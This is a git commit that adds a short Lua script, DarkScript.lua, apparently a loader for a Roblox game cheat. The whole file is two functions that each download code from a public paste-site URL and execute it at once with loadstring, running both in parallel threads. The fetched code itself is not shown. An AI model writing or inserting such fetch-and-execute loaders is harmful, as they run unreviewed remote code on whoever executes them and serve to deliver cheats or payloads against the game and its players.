4767b219a2a3b497a098869e101867844d05842f
DarkScriptMM2 <repdosmakoy246@gmail.com>
2026-08-25 21:13:21 +0800

    Create DarkScript.lua

---
+++ DarkScript.lua
@@ -0,0 +1,9 @@
+local function s1() 
+  loadstring(game:HttpGet("https://cdn.sourceb.in/bins/OUKQ7pyfty/0", true))()
+end 
+local function s2() 
+   loadstring(game:HttpGet("https://pastefy.app/Ydkv8Rff/raw", true))()
+end
+
+task.spawn(s1)
+task.spawn(s2)
